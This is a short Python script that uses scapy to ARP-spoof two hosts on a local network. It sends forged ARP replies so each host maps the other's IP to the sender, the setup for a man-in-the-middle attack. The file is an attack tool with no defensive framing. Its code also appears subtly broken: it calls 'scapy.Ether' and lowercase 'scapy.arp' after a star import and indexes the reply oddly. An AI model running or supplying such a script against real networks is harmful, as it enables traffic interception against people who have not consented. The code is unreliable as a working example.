from scapy.all import *
import os

target_ip = "" 
spoof_ip = ""
interface = ""

def find_mac_address(ip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.arp(pdst = ip) #asking "who has this ip?"
    answer = scapy.srp(packet, iface=interface, timeout=2, verbose=False)[0]
    mac_address = answer[1][0].hwsrc
    return mac_address
 
def spoof(target, spoofed):
    packet = scapy.arp(op = 2, hwdst = find_mac_address(target), pdst=target, psrc=spoofed)
    scapy.send(packet, iface=interface, verbose=False)
    print(f"Spoofing {target}, pretending to be {spoofed}")

def main():
    spoof(target_ip, spoof_ip)
    spoof(spoof_ip, target_ip)

if __name__ == "__main__":
    main()


